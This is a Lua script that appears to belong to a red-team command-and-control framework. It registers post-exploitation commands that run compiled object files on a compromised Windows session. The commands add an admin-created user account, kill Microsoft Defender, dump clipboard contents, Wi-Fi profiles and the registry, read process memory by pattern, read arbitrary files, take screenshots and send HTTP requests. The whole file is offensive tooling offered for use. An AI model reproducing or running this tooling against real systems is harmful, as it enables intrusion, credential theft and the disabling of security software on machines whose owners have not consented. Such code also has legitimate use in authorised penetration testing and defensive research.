local parent_command = "common"
local function bof_path(bof_name, arch)
    return "common/bof/" .. bof_name .. "." .. arch .. ".o"
end
local function command_register(command_name, command_function, help_string, ttp)
    command( parent_command .. ":" .. command_name, command_function, help_string, ttp)
end

-- netUserAdd
local function parse_netuseradd_bof(args)
    local size = #args
    if size < 2 then
        error(">=2 arguments are allowed")
    end
    local username = args[1]
    local password = args[2]
    return bof_pack("ZZ", username, password)
end
local function run_netuseradd_bof(args)
    args = parse_netuseradd_bof(args)
    local session = active()
    local arch = session.Os.Arch
    if not isadmin(session) then
        error("You need to be an admin to run this command")
    end
    local bof_file = bof_path("NetUserAdd", arch)
    return bof(session, script_resource(bof_file), args, true)
end
command_register("netuseradd_bof", run_netuseradd_bof, "netuseradd_bof <username> <password>", "")

-- curl
local function parse_curl_bof(args)
    local size = #args
    if size < 1 then
        error(">=1 arguments are allowed")
    end
    local host = args[1]
    local port = "80"
    local method = "GET"
    local header = "Accept: */*"
    local userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
    local body = ""

    if size >= 2 then
        port = args[2]
    end
    local valid_methods = {
        GET = true,
        POST = true,
        PUT = true,
        PATCH = true,
        DELETE = true
    }
    if size >= 3 then
        method = args[3]
        if not valid_methods[method] then
            error("HTTP method " .. method .. " isn't valid.")
        end
    end
    local output = 1
    if args[4] == "--disable-output" then
        output = 0
    end
    proxy = 1
    if args[4] == "--noproxy" then
        proxy = 0
    end
    if size >= 5 then
        userAgent = args[5]
    end
    if size >= 6 then
        header = args[6]
    end
    if size >= 7 then
        body = args[7]
    end
    return bof_pack("zizizzzi", host, port, method, output, userAgent, header, body, proxy)
end

local function run_curl_bof(args)
    args = parse_curl_bof(args)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("curl",arch)
    return bof(session, script_resource(bof_file), args, true)
end
command_register("curl_bof", run_curl_bof, "curl <host> [port] [method] [--show|--noproxy] [userAgent] [header] [body]", "")
-- readfile

local function run_readfile_bof(args)
    if args[1] == nil then
        error(">=1 arguments are allowed")
    end
    local file_path = args[1]
    local packed_args = bof_pack("z", file_path)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("readfile", arch)
    return bof(session, script_resource(bof_file), packed_args, true)
end
command_register("readfile_bof", run_readfile_bof, "readfile_bof <file_path>", "")

-- kill_defender
local function parse_kill_defender_bof(args)
    local size = #args
    if size < 1 then
        error(">=1 arguments are allowed")
    end
    local action = args[1]
    if action == "kill" or action == "check" then
        local username = session.Os.Username
    end
    return bof_pack("z", args[1])
end
local function run_kill_defender_bof(args)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("kill_defender", arch)
    return bof(session, script_resource(bof_file), args, true)
end
command_register("kill_defender_bof", run_kill_defender_bof, "kill_defender_bof <action>", "")
-- clipboard
local function run_clipboard_bof(args)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("clipboard", arch)
    return bof(session, script_resource(bof_file), args, true)
end
-- dump clipboard
local function run_dump_clipboard(args)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("dump_clipboard", arch)
    return bof(session, script_resource(bof_file), args, true)
end
command_register("dump_clipboard_bof", run_dump_clipboard, "dump_clipboard_bof", "")
-- wifidump
local function parse_wifidump_bof(args)
    local size = #args
    if size < 1 then
        error(">=1 arguments are allowed")
    end
    print(args[1])
    local interface = args[1]
    return bof_pack("Z", interface)
end
local function run_wifidump_bof(args)
    args = parse_wifidump_bof(args)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("wifidump", arch)
    return bof(session, script_resource(bof_file), args, true)
end
command_register("wifidump_bof", run_wifidump_bof, "wifidump_bof <profilename>", "")

-- wifienum
local function run_wifienum_bof(args)
    if #args > 0 then
        error("no arguments are allowed")
    end
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("wifienum", arch)
    return bof(session, script_resource(bof_file), args, true)
end
command_register("wifienum_bof", run_wifienum_bof, "wifienum_bof", "")

-- memory info
local function run_read_memory_bof()
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("memory", arch)
    return bof(session, script_resource(bof_file), {}, true)
end
command_register("meminfo_bof", run_read_memory_bof, "meminfo_bof", "")

-- memory reader
-- Usage : memreader <target-pid> <pattern> <output-size>
local function parse_memory_reader_bof(args)
    local size = #args
    if size < 2 then
        error(">=2 arguments are allowed")
    end
    local target_pid = args[1]
    local pattern = args[2]
    local output_size= 10
    if size == 3 then
        output_size = args[3]
    end
    return bof_pack( "izi", target_pid, pattern, output_size)
end

local function run_memory_reader_bof(args)
    args = parse_memory_reader_bof(args)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("memreader", arch)
    return bof(session, script_resource(bof_file), args, true)
end
command_register("mem_reader_bof", run_memory_reader_bof, "common mem_reader_bof <target-pid> <pattern> <output-size>", "")

-- regdump
local function run_regdump_bof(args)
    local session = active()
    if not isadmin(session) then
        error("You need to be an admin to run this command")
    end
    local location = args[1] or ""
    local packed_args = bof_pack("z", location)

    local arch = session.Os.Arch
    local bof_file = bof_path("regdump", arch)
    return bof(session, script_resource(bof_file), packed_args, true)
end
command_register("regdump_bof", run_regdump_bof, "regdump_bof <location>", "")

-- screenshot
local function run_screenshot(args)
    local filename
    if #args == 1 then
        filename = args[1]
    else
        filename = "screenshot.jpg"
    end
    local packed_args = bof_pack("z", filename)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("screenshot", arch)
    local result = bof(session, script_resource(bof_file), packed_args, true, callback_bof(session, filename))
    if result == false then return "Screenshot failed" end
    return "Screenshot OK"
end
command_register("screenshot_bof", run_screenshot, "Command: situational screenshot <filename>", "T1113")